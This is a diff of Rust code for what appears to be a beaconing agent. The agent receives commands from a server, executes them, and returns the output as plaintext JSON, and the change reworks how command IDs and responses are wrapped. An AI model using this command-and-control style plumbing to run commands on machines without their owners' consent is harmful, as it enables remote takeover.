@@ -156,24 +156,44 @@ async fn run_agent(
                         Ok(Some(cmd_str)) => {
                             info!("📥 Command received: {}", cmd_str);
 
-                            if let Ok(cmd) = serde_json::from_str::<CommandType>(&cmd_str) {
+                            // Parse wrapper with cmd_id
+                            let wrapper: serde_json::Value = match serde_json::from_str(&cmd_str) {
+                                Ok(v) => v,
+                                Err(_) => { error!("Failed to parse command wrapper"); continue; }
+                            };
+                            let cmd_id = wrapper.get("cmd_id").and_then(|v| v.as_u64()).unwrap_or(0);
+                            let cmd_data = match wrapper.get("cmd") {
+                                Some(d) => d.clone(),
+                                None => { error!("No cmd field in wrapper"); continue; }
+                            };
+
+                            if let Ok(cmd) = serde_json::from_value::<CommandType>(cmd_data) {
                                 let result = Executor::execute_command(&cmd).await;
                                 info!("✅ Command executed in {}ms", result.execution_time_ms);
 
-                                let response = communicator::CommandResponse {
-                                    command_id: 1,
-                                    status: result.status.clone(),
-                                    output: result.output.clone(),
-                                    error: result.error.clone(),
-                                    execution_time: result.execution_time_ms as u64,
-                                };
-
-                                if let Err(e) = communicator.send_command_result(&response).await {
+                                // Send plaintext response so server can read it
+                                let resp_msg = serde_json::json!({
+                                    "msg_type": "RESPONSE",
+                                    "cmd_id": cmd_id,
+                                    "status": result.status,
+                                    "output": result.output,
+                                    "error": result.error,
+                                    "execution_time_ms": result.execution_time_ms,
+                                });
+                                if let Err(e) = communicator.send_raw(&resp_msg.to_string()).await {
                                     error!("Failed to send command result: {}", e);
                                     break 'beacon;
                                 }
                             } else {
-                                error!("Failed to parse command");
+                                error!("Failed to parse command type");
+                                let resp_msg = serde_json::json!({
+                                    "msg_type": "RESPONSE",
+                                    "cmd_id": cmd_id,
+                                    "status": "error",
+                                    "output": "",
+                                    "error": "Failed to parse command",
+                                });
+                                let _ = communicator.send_raw(&resp_msg.to_string()).await;
                             }
                         }
                         Ok(None) => {
